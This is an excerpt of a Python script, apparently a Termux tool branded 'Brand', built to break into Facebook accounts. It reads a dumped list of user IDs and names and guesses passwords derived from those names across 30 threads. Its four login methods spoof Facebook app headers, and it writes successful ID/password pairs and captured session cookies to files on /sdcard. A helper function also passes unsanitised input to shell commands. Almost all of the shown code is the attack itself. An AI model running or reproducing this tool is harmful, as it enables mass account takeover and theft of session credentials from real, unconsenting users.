...
from concurrent.futures import ThreadPoolExecutor as BrandBrand
from string import * 
...
model2 = requests.get('https://github.com/MrHaxn/Haxn/blob/main/Approval.txt').text.splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
...
sys.stdout.write('\x1b]2; Brand\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Hassan Raz
\033[1;37m Facebook:         Can't Find Me
\033[1;37m Github  :             MrHaxn
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Brand Menu ")
        exit()
...
def Brand():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open Follow this link to join my WhatsApp group: https://chat.whatsapp.com/EThjvv7RVCvAyqmsFlh6Jm')
        pass
    elif select =='F':
        os.system('xdg-open https://facebook.com/groups/636246224644670/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        Brand(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Brand] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Brandb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Brandb};{ckkk}"
                    print(f"\r{R} [Brand-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Brand_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Brand_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [Brand-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Brand_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Brand] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Brand-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Brand_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Brand_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Brand-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Brand] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Brand] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Brand-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Brand_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with BrandBrand(max_workers=30) as Brandworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                Brandworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                Brandworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                Brandworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                Brandworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/Brand.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/Brand.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    Brand = input('Put File Name :')
    print(" ")
    Brand = input('Saving Put File Name :')
    os.system('touch ' +Brand)
    os.system('sort -r '+Brand+' | uniq > '+Brand)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + Brand )
    print(47*'-')
    print("File Saved To :" + Brand )
    print(47*'-')
    input(f"{S} Press Enter To Back Brand Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/Brand.txt\n') 
        filepath = input("Put File Name: ")
